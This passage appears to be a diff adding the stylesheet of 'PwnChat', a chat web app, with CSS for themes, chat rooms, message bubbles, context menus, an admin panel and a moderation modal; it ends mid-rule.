@@ -1,0 +1,3475 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PwnChat</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700&display=swap');
+
+  :root {
+    --bg-dark: #090a0f;
+    --surface-card: #12151e;
+    --surface-hover: #1c202d;
+    --surface-border: #232838;
+    --accent-glow: #6366f1;
+    --accent-glow-hover: #4f46e5;
+    --accent-neon: #a855f7;
+    --text-primary: #f3f4f6;
+    --text-secondary: #9ca3af;
+    --text-muted: #6b7280;
+    --bg-gradient-1: rgba(99, 102, 241, 0.12);
+    --bg-gradient-2: rgba(168, 85, 247, 0.12);
+  }
+
+  body.theme-claudchat {
+    background-color: #f5f5f5 !important;
+    background-image: none !important;
+    color: #111111 !important;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif !important;
+  }
+
+  body.theme-claudchat #app {
+    background: #ffffff !important;
+    backdrop-filter: none !important;
+    -webkit-backdrop-filter: none !important;
+    border: none !important;
+    box-shadow: 0 0 20px rgba(0,0,0,0.08) !important;
+  }
+
+  body.theme-claudchat * {
+    animation: none !important;
+    transition: none !important;
+  }
+
+  body.theme-claudchat input[type="text"] {
+    background: #f0f0f0 !important;
+    border: 1px solid #ddd !important;
+    color: #111111 !important;
+    border-radius: 8px !important;
+  }
+
+  body.theme-claudchat input[type="text"]::placeholder {
+    color: #888888 !important;
+  }
+
+  body.theme-claudchat button {
+    background: #f0f0f0 !important;
+    border: 1px solid #ddd !important;
+    color: #111111 !important;
+    border-radius: 8px !important;
+  }
+
+  body.theme-claudchat button:hover {
+    background: #e5e5e5 !important;
+    transform: none !important;
+  }
+
+  body.theme-claudchat .primary-btn {
+    background: #007aff !important;
+    color: #ffffff !important;
+    border: none !important;
+    box-shadow: none !important;
+  }
+
+  body.theme-claudchat .primary-btn:hover {
+    background: #0056b3 !important;
+    box-shadow: none !important;
+  }
+
+  body.theme-claudchat #join-screen h2 {
+    background: none !important;
+    -webkit-background-clip: unset !important;
+    -webkit-text-fill-color: #111111 !important;
+    color: #111111 !important;
+  }
+
+  body.theme-claudchat #join-screen p,
+  body.theme-claudchat #rooms-screen .sub,
+  body.theme-claudchat .section-label,
+  body.theme-claudchat .divider-with-text,
+  body.theme-claudchat .empty-note,
+  body.theme-claudchat .room-creator-tag {
+    color: #666666 !important;
+  }
+
+  body.theme-claudchat .nickname-option-btn,
+  body.theme-claudchat .room-item,
+  body.theme-claudchat details.main-details {
+    background: #ffffff !important;
+    border: 1px solid #e5e5e5 !important;
+    color: #111111 !important;
+  }
+
+  body.theme-claudchat .nickname-option-btn:hover,
+  body.theme-claudchat .room-item:hover {
+    background: #f9f9f9 !important;
+    border-color: #007aff !important;
+  }
+
+  body.theme-claudchat details.main-details summary {
+    color: #111111 !important;
+  }
+
+  body.theme-claudchat .room-code-tag {
+    background: #eef2f5 !important;
+    color: #007aff !important;
+  }
+
+  body.theme-claudchat #chat-header {
+    background: #ffffff !important;
+    border-bottom: 1px solid #eeeeee !important;
+    backdrop-filter: none !important;
+    -webkit-backdrop-filter: none !important;
+  }
+
+  body.theme-claudchat #chat-header button {
+    background: #f0f0f0 !important;
+    color: #111111 !important;
+  }
+
+  body.theme-claudchat #chat-subheader {
+    background: #f9f9f9 !important;
+    border-bottom: 1px solid #eeeeee !important;
+    color: #666666 !important;
+  }
+
+  body.theme-claudchat .mine .bubble {
+    background: #007aff !important;
+    color: #ffffff !important;
+    box-shadow: none !important;
+  }
+
+  body.theme-claudchat .theirs .bubble {
+    background: #f0f0f0 !important;
+    color: #111111 !important;
+    border: 1px solid #e0e0e0 !important;
+    box-shadow: none !important;
+  }
+
+  body.theme-claudchat .author-label {
+    color: #666666 !important;
+  }
+
+  body.theme-claudchat .time-label {
+    color: #888888 !important;
+  }
+
+  body.theme-claudchat #compose {
+    background: #ffffff !important;
+    border-top: 1px solid #eeeeee !important;
+  }
+
+  body.theme-claudchat #custom-context-menu,
+  body.theme-claudchat #room-context-menu,
+  body.theme-claudchat #room-space-context-menu,
+  body.theme-claudchat #main-page-space-context-menu,
+  body.theme-claudchat #photo-context-menu,
+  body.theme-claudchat #theme-context-menu,
+  body.theme-claudchat .toast-card,
+  body.theme-claudchat .modal-card,
+  body.theme-claudchat #moderation-modal-card {
+    background: #ffffff !important;
+    border: 1px solid #dddddd !important;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.15) !important;
+    backdrop-filter: none !important;
+    -webkit-backdrop-filter: none !important;
+  }
+
+  .context-item.success {
+    color: #10B981;
+  }
+  .context-item.success:hover {
+    background: rgba(16, 185, 129, 0.15);
+    color: #34d399;
+  }
+
+  body.theme-claudchat .context-item {
+    color: #111111 !important;
+  }
+
+  body.theme-claudchat .context-item:hover {
+    background: #f0f0f0 !important;
+  }
+
+  body.theme-claudchat .toast-sender,
+  body.theme-claudchat .toast-body,
+  body.theme-claudchat .modal-card h3,
+  body.theme-claudchat #moderation-modal-card h2 {
+    color: #111111 !important;
+  }
+
+  * { 
+    box-sizing: border-box; 
+    margin: 0;
+    padding: 0;
+  }
+
+  body {
+    font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, sans-serif;
+    background-color: var(--bg-dark);
+    background-image: 
+      radial-gradient(at 0% 0%, var(--bg-gradient-1) 0px, transparent 50%),
+      radial-gradient(at 100% 100%, var(--bg-gradient-2) 0px, transparent 50%);
+    color: var(--text-primary);
+    height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    overflow: hidden;
+  }
+
+  #app {
+    width: 100%;
+    max-width: 440px;
+    height: 100vh;
+    max-height: 900px;
+    display: flex;
+    flex-direction: column;
+    background: rgba(18, 21, 30, 0.7);
+    backdrop-filter: blur(16px);
+    -webkit-backdrop-filter: blur(16px);
+    border: 1px solid rgba(255, 255, 255, 0.08);
+    box-shadow: 0 24px 48px -12px rgba(0, 0, 0, 0.7);
+    position: relative;
+    overflow: hidden;
+  }
+
+  @media (min-width: 480px) {
+    #app {
+      height: 92vh;
+      border-radius: 24px;
+    }
+  }
+
+  input, button {
+    font-size: 14px;
+    font-family: inherit;
+    transition: all 0.2s cubic-bezier(0.16, 1, 0.3, 1);
+  }
+
+  input[type="text"] {
+    padding: 12px 16px;
+    background: rgba(255, 255, 255, 0.04);
+    border: 1px solid var(--surface-border);
+    border-radius: 12px;
+    color: var(--text-primary);
+    outline: none;
+    width: 100%;
+  }
+
+  input[type="text"]::placeholder {
+    color: var(--text-muted);
+  }
+
+  input[type="text"]:focus {
+    border-color: var(--accent-glow);
+    background: rgba(255, 255, 255, 0.07);
+    box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.25);
+  }
+
+  button {
+    padding: 12px 20px;
+    border: 1px solid var(--surface-border);
+    border-radius: 12px;
+    background: var(--surface-card);
+    color: var(--text-primary);
+    cursor: pointer;
+    font-weight: 600;
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+  }
+
+  button:hover { 
+    background: var(--surface-hover);
+    border-color: rgba(255, 255, 255, 0.15);
+    transform: translateY(-1px);
+  }
+
+  button:active {
+    transform: translateY(0);
+  }
+
+  button:disabled { 
+    opacity: 0.4; 
+    cursor: not-allowed; 
+    transform: none !important;
+  }
+
+  .primary-btn { 
+    background: linear-gradient(135deg, var(--accent-glow), var(--accent-neon));
+    color: #fff; 
+    border: none;
+    box-shadow: 0 4px 14px rgba(99, 102, 241, 0.35);
+  }
+  .primary-btn:hover { 
+    background: linear-gradient(135deg, var(--accent-glow-hover), #9333ea);
+    box-shadow: 0 6px 20px rgba(99, 102, 241, 0.5);
+  }
+
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(8px) scale(0.98); }
+    to { opacity: 1; transform: translateY(0) scale(1); }
+  }
+
+  @keyframes fadeOut {
+    from { opacity: 1; transform: translateY(0) scale(1); }
+    to { opacity: 0; transform: translateY(8px) scale(0.98); }
+  }
+
+  @keyframes popIn {
+    0% { transform: scale(0.95); opacity: 0; }
+    100% { transform: scale(1); opacity: 1; }
+  }
+
+  @keyframes slideInToast {
+    from { transform: translateX(120%); opacity: 0; }
+    to { transform: translateX(0); opacity: 1; }
+  }
+
+  @keyframes slideOutToast {
+    from { transform: translateX(0); opacity: 1; }
+    to { transform: translateX(120%); opacity: 0; }
+  }
+
+  #toast-container {
+    position: fixed;
+    bottom: 24px;
+    right: 24px;
+    z-index: 40000;
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+    pointer-events: none;
+  }
+
+  .toast-card {
+    width: 380px;
+    background: rgba(18, 21, 30, 0.92);
+    backdrop-filter: blur(20px);
+    -webkit-backdrop-filter: blur(20px);
+    border: 1px solid rgba(99, 102, 241, 0.25);
+    border-radius: 16px;
+    padding: 16px 20px;
+    box-shadow: 0 16px 40px rgba(0, 0, 0, 0.7), 0 0 20px rgba(99, 102, 241, 0.1);
+    pointer-events: auto;
+    animation: slideInToast 0.8s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+    display: flex;
+    flex-direction: column;
+    gap: 6px;
+  }
+
+  .toast-card.hiding {
+    animation: slideOutToast 0.8s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+  }
+
+  .toast-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 11px;
+    font-weight: 700;
+    color: var(--accent-neon);
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+  }
+
+  .toast-sender {
+    font-weight: 600;
+    color: var(--text-primary);
+    font-size: 13px;
+  }
+
+  .toast-body {
+    font-size: 13px;
+    color: var(--text-secondary);
+    word-break: break-all;
+    display: -webkit-box;
+    -webkit-line-clamp: 2;
+    -webkit-box-orient: vertical;
+    overflow: hidden;
+  }
+
+  #theme-toggle-btn {
+    position: fixed;
+    top: 12px;
+    right: 12px;
+    z-index: 10000;
+    background: #111;
+    color: #fff;
+    border: 1px solid #333;
+    width: 36px;
+    height: 36px;
+    padding: 0;
+    border-radius: 8px;
+    font-size: 16px;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    cursor: pointer;
+  }
+  #theme-toggle-btn:hover { background: #333; }
+
+  #code-editor-btn {
+    position: fixed;
+    top: 12px;
+    right: 56px;
+    z-index: 10000;
+    background: #111;
+    color: #fff;
+    border: 1px solid #333;
+    width: 36px;
+    height: 36px;
+    padding: 0;
+    border-radius: 8px;
+    font-size: 16px;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    cursor: pointer;
+  }
+  #code-editor-btn:hover { background: #333; }
+
+  #draggable-code-editor {
+    display: none;
+    position: fixed;
+    top: 60px;
+    right: 56px;
+    width: 320px;
+    height: 280px;
+    background: #12151e;
+    border: 1px solid var(--surface-border);
+    border-radius: 12px;
+    z-index: 15000;
+    box-shadow: 0 8px 24px rgba(0,0,0,0.6);
+    flex-direction: column;
+    overflow: hidden;
+    font-family: monospace;
+  }
+
+  #code-editor-header {
+    background: #1c202d;
+    padding: 8px 12px;
+    font-size: 12px;
+    font-weight: bold;
+    color: var(--text-primary);
+    cursor: move;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    border-bottom: 1px solid var(--surface-border);
+    user-select: none;
+  }
+
+  #code-editor-close {
+    background: transparent;
+    border: none;
+    color: var(--text-muted);
+    cursor: pointer;
+    font-size: 14px;
+    padding: 0;
+    width: 20px;
+    height: 20px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+  #code-editor-close:hover { color: #fff; background: transparent; transform: none; }
+
+  .code-editor-body {
+    display: flex;
+    flex: 1;
+    overflow: hidden;
+    position: relative;
+    background: #090a0f;
+  }
+
+  #code-line-numbers {
+    width: 36px;
+    background: #0d0e13;
+    color: var(--text-muted);
+    font-family: monospace;
+    font-size: 11px;
+    padding: 8px 4px;
+    text-align: right;
+    user-select: none;
+    overflow: hidden;
+    line-height: 1.4;
+    border-right: 1px solid var(--surface-border);
+  }
+
+  #code-textarea {
+    flex: 1;
+    background: transparent;
+    color: #f3f4f6;
+    font-family: monospace;
+    font-size: 11px;
+    padding: 8px;
+    border: none;
+    outline: none;
+    resize: none;
+    line-height: 1.4;
+    white-space: pre;
+    overflow: auto;
+    tab-size: 2;
+  }
+
+  #admin-panel {
+    display: none;
+    position: fixed;
+    top: 56px;
+    right: 12px;
+    width: 280px;
+    max-height: 80vh;
+    overflow-y: auto;
+    background: #1e1e1e;
+    color: #fff;
+    border: 1px solid #333;
+    border-radius: 8px;
+    padding: 14px;
+    z-index: 10000;
+    box-shadow: 0 4px 16px rgba(0,0,0,0.3);
+    font-size: 13px;
+  }
+  #admin-panel h3 { margin: 0 0 10px; font-size: 14px; color: #ff5555; text-transform: uppercase; letter-spacing: 0.05em; }
+  
+  #admin-panel details, details.main-details {
+    background: #2a2a2a;
+    border: 1px solid #444;
+    border-radius: 6px;
+    margin-bottom: 8px;
+    padding: 6px 8px;
+  }
+
+  details.main-details {
+    background: var(--surface-card);
+    border: 1px solid var(--surface-border);
+    border-radius: 14px;
+    margin-top: 6px;
+    padding: 8px 12px;
+  }
+
+  #admin-panel summary, details.main-details summary {
+    font-weight: bold;
+    cursor: pointer;
+    outline: none;
+    color: #ddd;
+    user-select: none;
+  }
+
+  details.main-details summary {
+    color: var(--text-primary);
+    font-size: 14px;
+  }
+
+  #admin-panel details[open] summary, details.main-details[open] summary {
+    margin-bottom: 8px;
+    color: #fff;
+  }
+
+  #admin-panel details details {
+    background: #222;
+    border: 1px solid #3a3a3a;
+    margin-top: 6px;
+    margin-bottom: 4px;
+  }
+
+  #admin-panel .admin-btn {
+    width: 100%;
+    margin-top: 6px;
+    background: #c0392b;
+    color: white;
+    border: none;
+    padding: 8px;
+    border-radius: 6px;
+    font-size: 12px;
+    font-weight: 600;
+  }
+  #admin-panel .admin-btn.secondary {
+    background: #2980b9;
+  }
+  #admin-panel .admin-btn.secondary:hover { background: #3498db; }
+  #admin-panel .admin-btn.warning {
+    background: #e74c3c;
+  }
+  #admin-panel .admin-btn.warning:hover { background: #c0392b; }
+  #admin-panel .admin-btn.orange-btn {
+    background: #d35400;
+  }
+  #admin-panel .admin-btn.orange-btn:hover { background: #e67e22; }
+  #admin-panel .admin-btn:hover { background: #e74c3c; }
+  #admin-panel .admin-info { margin-bottom: 8px; color: #bbb; font-size: 12px; }
+  .panel-status { margin-top: 6px; font-size: 11px; color: #e74c3c; display: none; }
+
+  .admin-rooms-list {
+    margin-top: 6px;
+    display: flex;
+    flex-direction: column;
+    gap: 6px;
+    max-height: 150px;
+    overflow-y: auto;
+  }
+  .admin-room-item {
+    width: 100%;
+    background: #333;
+    color: #fff;
+    border: 1px solid #555;
+    padding: 6px 8px;
+    border-radius: 4px;
+    text-align: left;
+    font-size: 11px;
+    cursor: pointer;
+    word-break: break-all;
+  }
+  .admin-room-item:hover {
+    background: #444;
+  }
+
+  #join-screen {
+    padding: 2rem 1.5rem;
+    text-align: center;
+    display: flex;
+    flex-direction: column;
+    height: 100%;
+    justify-content: center;
+    align-items: stretch;
+    overflow-y: auto;
+    animation: popIn 0.35s cubic-bezier(0.16, 1, 0.3, 1);
+  }
+  #join-screen::-webkit-scrollbar { width: 4px; }
+  #join-screen::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.1); border-radius: 4px; }
+
+  #join-screen h2 { 
+    font-size: 28px; 
+    font-weight: 700; 
+    letter-spacing: -0.02em; 
+    margin-bottom: 8px; 
+    background: linear-gradient(135deg, #fff 30%, var(--text-secondary));
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+  }
+  #join-screen p { color: var(--text-secondary); font-size: 14px; margin-bottom: 16px; }
+  #join-screen input { max-width: 320px; margin: 0 auto 12px; text-align: center; }
+  #join-screen button#join-btn { width: 100%; max-width: 320px; margin: 0 auto; }
+  #join-error { color: #f87171; font-size: 13px; margin-top: 12px; display: none; }
+
+  .nickname-picker-container {
+    display: flex;
+    flex-direction: column;
+    gap: 6px;
+    max-height: 280px;
+    overflow-y: auto;
+    padding-right: 4px;
+  }
+  .nickname-picker-container::-webkit-scrollbar { width: 4px; }
+  .nickname-picker-container::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.1); border-radius: 4px; }
+
+  .nickname-option-btn {
+    width: 100%;
+    background: var(--surface-card);
+    border: 1px solid var(--surface-border);
+    padding: 10px 14px;
+    border-radius: 12px;
+    color: var(--text-primary);
+    font-size: 13px;
+    font-weight: 500;
+    text-align: left;
+    cursor: pointer;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
+  .nickname-option-btn:hover {
+    background: var(--surface-hover);
+    border-color: rgba(99, 102, 241, 0.4);
+  }
+
+  #rooms-screen { 
+    display: none; 
+    flex-direction: column; 
+    height: 100%; 
+    overflow-y: auto; 
+    padding: 1.5rem; 
+    animation: fadeIn 0.3s ease-out;
+  }
+  #rooms-screen.animating-out {
+    animation: fadeOut 0.25s ease-in forwards;
+  }
+  #rooms-screen::-webkit-scrollbar { width: 4px; }
+  #rooms-screen::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.1); border-radius: 4px; }
+
+  #rooms-screen h2 { font-size: 24px; font-weight: 700; margin-bottom: 4px; }
+  #rooms-screen .sub { color: var(--text-secondary); font-size: 13px; margin-bottom: 20px; }
+  #rooms-screen .sub a { color: var(--accent-glow); text-decoration: none; font-weight: 600; }
+  #rooms-screen .sub a:hover { text-decoration: underline; }
+
+  .section-label { 
+    font-size: 11px; 
+    font-weight: 700; 
+    text-transform: uppercase; 
+    letter-spacing: 0.08em; 
+    color: var(--text-muted); 
+    margin: 24px 0 10px; 
+  }
+
+  .room-item {
+    width: 100%; 
+    text-align: left; 
+    padding: 14px 16px; 
+    margin-bottom: 8px;
+    border-radius: 14px; 
+    border: 1px solid var(--surface-border); 
+    background: var(--surface-card); 
+    color: var(--text-primary);
+    font-weight: 600;
+    justify-content: space-between;
+  }
+  .room-item:hover { 
+    background: var(--surface-hover); 
+    border-color: rgba(99, 102, 241, 0.4); 
+  }
+
+  .room-info-group {
+    display: flex;
+    flex-direction: column;
+    gap: 2px;
+  }
+
+  .room-creator-tag {
+    font-size: 11px;
+    font-weight: 400;
+    color: var(--text-muted);
+  }
+
+  .room-code-tag {
+    font-size: 11px;
+    font-weight: 500;
+    color: var(--text-muted);
+    background: rgba(255, 255, 255, 0.06);
+    padding: 3px 8px;
+    border-radius: 6px;
+    letter-spacing: 0.05em;
+  }
+
+  #everyone-room-btn, #global-chat-room-btn { 
+    width: 100%; 
+    padding: 16px; 
+    font-size: 15px; 
+    letter-spacing: 0.01em;
+    margin-bottom: 8px;
+  }
+
+  .empty-note { font-size: 13px; color: var(--text-muted); padding: 12px 4px; text-align: center; }
+  .code-row { display: flex; gap: 8px; }
+  .code-row input { text-transform: uppercase; letter-spacing: 0.1em; font-weight: 600; }
+  
+  #show-create-btn {
+    width: 100%;
+    background: rgba(255, 255, 255, 0.02);
+    border-style: dashed;
+  }
+
+  #create-room-form { 
+    margin-top: 12px; 
+    padding: 16px; 
+    border: 1px solid var(--surface-border); 
+    border-radius: 16px; 
+    background: rgba(0, 0, 0, 0.2);
+    display: none; 
+    animation: fadeIn 0.2s ease-out;
+  }
+  #create-room-form input { margin-bottom: 12px; }
+  #create-room-form label { display: flex; align-items: center; gap: 10px; font-size: 13px; color: var(--text-secondary); margin-bottom: 16px; cursor: pointer; }
+  #create-room-form input[type="checkbox"] { accent-color: var(--accent-glow); width: 16px; height: 16px; }
+  #create-room-form button { width: 100%; }
+
+  .divider-with-text {
+    display: flex;
+    align-items: center;
+    text-align: center;
+    color: var(--text-muted);
+    font-size: 12px;
+    font-weight: 600;
+    margin: 24px 0;
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+  }
+  .divider-with-text::before,
+  .divider-with-text::after {
+    content: '';
+    flex: 1;
+    border-bottom: 1px solid var(--surface-border);
+  }
+  .divider-with-text::before {
+    margin-right: 10px;
+  }
+  .divider-with-text::after {
+    margin-left: 10px;
+  }
+
+  #rooms-error { color: #f87171; font-size: 13px; margin-top: 10px; display: none; }
+
+  #chat-screen { display: none; flex-direction: column; height: 100%; animation: fadeIn 0.25s ease-out; }
+  
+  #chat-header {
+    display: flex; 
+    align-items: center; 
+    justify-content: space-between;
+    padding: 14px 16px; 
+    border-bottom: 1px solid var(--surface-border); 
+    background: rgba(18, 21, 30, 0.8);
+    backdrop-filter: blur(8px);
+    gap: 8px;
+  }
+  #chat-header .header-left { display: flex; align-items: center; gap: 10px; min-width: 0; }
+  #chat-header .room-title { font-weight: 700; font-size: 16px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+  #chat-header button { font-size: 12px; padding: 6px 12px; flex-shrink: 0; border-radius: 8px; background: rgba(255,255,255,0.05); }
+  #chat-header button:hover { background: rgba(255,255,255,0.1); }
+  
+  #chat-subheader { font-size: 11px; color: var(--text-muted); padding: 6px 16px; background: rgba(0,0,0,0.15); border-bottom: 1px solid rgba(255,255,255,0.02); }
+
+  #messages {
+    flex: 1; 
+    overflow-y: auto; 
+    padding: 16px; 
+    display: flex;
+    flex-direction: column; 
+    gap: 12px;
+  }
+  #messages::-webkit-scrollbar { width: 4px; }
+  #messages::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.1); border-radius: 4px; }
+
+  .msg-row { display: flex; flex-direction: column; }
+  .msg-row.animate-new { animation: fadeIn 0.15s ease-out; }
+  .msg-row.mine { align-items: flex-end; }
+  .msg-row.theirs { align-items: flex-start; }
+  
+  .bubble {
+    max-width: 78%; 
+    padding: 10px 14px; 
+    border-radius: 18px;
+    font-size: 14px; 
+    line-height: 1.45; 
+    word-wrap: break-word;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+  }
+  .mine .bubble { 
+    background: linear-gradient(135deg, var(--accent-glow), var(--accent-neon)); 
+    color: #fff; 
+    border-bottom-right-radius: 4px; 
+  }
+  .theirs .bubble { 
+    background: var(--surface-hover); 
+    color: var(--text-primary); 
+    border: 1px solid var(--surface-border);
+    border-bottom-left-radius: 4px; 
+  }
+  
+  .author-label { font-size: 11px; font-weight: 600; color: var(--text-muted); margin-bottom: 4px; padding: 0 6px; }
+  .time-label { font-size: 10px; color: rgba(255, 255, 255, 0.4); margin-top: 4px; padding: 0 6px; }
+  .theirs .time-label { color: var(--text-muted); }
+
+  #compose { 
+    display: flex; 
+    gap: 8px; 
+    padding: 12px 14px; 
+    border-top: 1px solid var(--surface-border); 
+    background: rgba(18, 21, 30, 0.9);
+    align-items: center; 
+    position: relative;
+  }
+  #msg-input { flex: 1; border-radius: 20px; padding: 10px 16px; }
+  #send-btn { border-radius: 20px; padding: 10px 18px; }
+  #photo-btn { padding: 10px; font-size: 16px; line-height: 1; flex-shrink: 0; border-radius: 50%; width: 40px; height: 40px; }
+  #file-input { display: none; }
+  #admin-base-file-input { display: none; }
+
+  .bubble img { max-width: 100%; max-height: 260px; border-radius: 12px; display: block; cursor: pointer; transition: transform 0.2s; }
+  .bubble img:hover { transform: scale(1.02); }
+  .bubble.image-bubble { padding: 4px; background: transparent !important; border: none !important; box-shadow: none !important; }
+
+  #upload-status { font-size: 12px; color: var(--accent-neon); padding: 4px 16px; display: none; text-align: center; }
+
+  #connection-banner {
+    font-size: 12px; 
+    text-align: center; 
+    padding: 8px; 
+    background: rgba(234, 179, 8, 0.15);
+    color: #fde047; 
+    border-bottom: 1px solid rgba(234, 179, 8, 0.3);
+    display: none;
+  }
+  
+
+  #custom-context-menu, #room-context-menu, #room-space-context-menu, #main-page-space-context-menu, #photo-context-menu, #theme-context-menu {
+    display: none;
+    position: fixed;
+    z-index: 20000;
+    width: 240px;
+    background: rgba(18, 21, 30, 0.85);
+    backdrop-filter: blur(20px);
+    -webkit-backdrop-filter: blur(20px);
+    border: 1px solid rgba(255, 255, 255, 0.12);
+    border-radius: 16px;
+    box-shadow: 0 12px 32px rgba(0, 0, 0, 0.6), 0 0 0 1px rgba(0, 0, 0, 0.4);
+    overflow: hidden;
+    padding: 6px;
+    animation: popIn 0.15s cubic-bezier(0.16, 1, 0.3, 1);
+  }
+
+  .context-item {
+    padding: 10px 14px;
+    font-size: 13px;
+    font-weight: 500;
+    color: var(--text-primary);
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    border-radius: 10px;
+    transition: all 0.15s ease;
+  }
+
+  .context-item:hover {
+    background: var(--surface-hover);
+    color: var(--text-primary);
+  }
+
+  .context-item.danger {
+    color: #f87171;
+  }
+
+  .context-item.danger:hover {
+    background: rgba(239, 68, 68, 0.15);
+    color: #fca5a5;
+  }
+
+  .context-item.warning {
+    color: #f87171;
+  }
+
+  .context-item.warning:hover {
+    background: rgba(239, 68, 68, 0.15);
+    color: #fca5a5;
+  }
+
+  .context-item.orange-item {
+    color: #f97316;
+  }
+
+  .context-item.orange-item:hover {
+    background: rgba(249, 115, 22, 0.15);
+    color: #fb923c;
+  }
+
+  #ctx-main-read-db {
+    color: #2980B9;
+  }
+  #ctx-main-read-db:hover {
+    background: rgba(41, 128, 185, 0.15);
+    color: #3498db;
+  }
+
+  #user-action-modal {
+    display: none;
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(9, 10, 15, 0.6);
+    backdrop-filter: blur(4px);
+    -webkit-backdrop-filter: blur(4px);
+    z-index: 30000;
+    justify-content: center;
+    align-items: center;
+    animation: fadeIn 0.2s ease-out;
+  }
+
+  .modal-card {
+    background: var(--surface-card);
+    border: 1px solid var(--surface-border);
+    border-radius: 18px;
+    padding: 20px;
+    width: 280px;
+    box-shadow: 0 16px 36px rgba(0, 0, 0, 0.5);
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+  }
+
+  .modal-card h3 {
+    font-size: 16px;
+    font-weight: 600;
+    color: var(--text-primary);
+  }
+
+  .modal-actions {
+    display: flex;
+    gap: 8px;
+    justify-content: flex-end;
+  }
+
+  .modal-actions button {
+    padding: 8px 14px;
+    font-size: 12px;
+  }
+
+  #moderation-modal {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(9, 10, 15, 0.75);
+    backdrop-filter: blur(8px);
+    -webkit-backdrop-filter: blur(8px);
+    z-index: 40000;
+    justify-content: center;
+    align-items: center;
+  }
+
+  #moderation-modal-card {
+    background: var(--surface-card); 
+    border: 1px solid var(--surface-border);
+    border-radius: 18px; 
+    padding: 24px; 
+    width: 100%;
+    max-width: 420px;
+    height: 80vh;
+    box-shadow: 0 16px 36px rgba(0, 0, 0, 0.5);
+    display: flex; 
+    flex-direction: column; 
+    gap: 16px;
+    position: relative;
+  }
+
+  #moderation-modal-card h2 {
+    font-size: 20px;
+    font-weight: 700;
+    color: var(--text-primary);
+    text-align: center;
+    border-bottom: 1px solid var(--surface-border);
+    padding-bottom: 12px;
+    margin: 0;
+  }
+
+  .mod-tabs { 
+    display: flex; 
+    gap: 8px; 
+  }
+  
+  .mod-tab-btn { 
+    flex: 1; 
+    padding: 10px; 
+    background: rgba(255,255,255,0.05); 
+    border: 1px solid var(--surface-border); 
+    border-radius: 12px; 
+    color: var(--text-secondary); 
+    cursor: pointer; 
+    transition: 0.2s; 
+    font-weight: 600; 
+  }
+  
+  .mod-tab-btn.active { 
+    background: var(--bg-gradient-1); 
+    border-color: var(--accent-glow); 
+    color: var(--text-primary);
+  }
+
+  .mod-users-list, .mod-reports-list, .mod-verified-list {
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+    overflow-y: auto;
+    flex: 1;
+    padding-right: 4px;
+  }
+
+  .mod-user-row, .mod-report-row, .mod-verified-row {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    background: rgba(255,255,255,0.03);
+    border: 1px solid var(--surface-border);
+    padding: 14px;
+    border-radius: 12px;
+    font-size: 14px;
+  }
+  
+  .mod-report-row {
+    flex-direction: column;
+    gap: 8px;
+  }
+  
+  .report-header { 
+    display: flex; 
+    justify-content: space-between; 
+    align-items: center; 
+    width: 100%;
+  }
+  
+  .report-text { 
+    background: rgba(0,0,0,0.2); 
+    padding: 10px; 
+    border-radius: 8px; 
+    font-style: italic; 
+    color: var(--text-secondary); 
+    word-break: break-word;
+    width: 100%;
+  }
+  
+
+  
+  .report-actions { 
+    display: flex; 
+    gap: 8px; 
+    justify-content: flex-end; 
+    width: 100%;
+    margin-top: 4px; 
+  }
+
+  .mod-ban-btn {
+    background: #ef4444;
+    color: #fff;
+    border: none;
+    padding: 8px 12px;
+    border-radius: 8px;
+    font-size: 12px;
+    cursor: pointer;
+  }
+  .mod-ban-btn:hover { background: #dc2626; transform: none; }
+
+  .mod-ban-btn.unban {
+    background: #10b981;
+  }
+  .mod-ban-btn.unban:hover { background: #059669; }
+
+  .mod-verified-list {
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+    overflow-y: auto;
+    flex: 1;
+    padding-right: 4px;
+  }
+
+  .mod-verified-row {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    background: rgba(255,255,255,0.03);
+    border: 1px solid var(--surface-border);
+    padding: 14px;
+    border-radius: 12px;
+    font-size: 14px;
+  }
+
+  .verified-header-actions {
+    display: flex;
+    justify-content: flex-end;
+    margin-bottom: 12px;
+  }
+
+  .mod-verified-add-btn {
+    background: var(--accent-glow);
+    color: #fff;
+    border: none;
+    padding: 10px 16px;
+    border-radius: 10px;
+    font-size: 13px;
+    cursor: pointer;
+  }
+
+  .mod-verified-add-btn:hover {
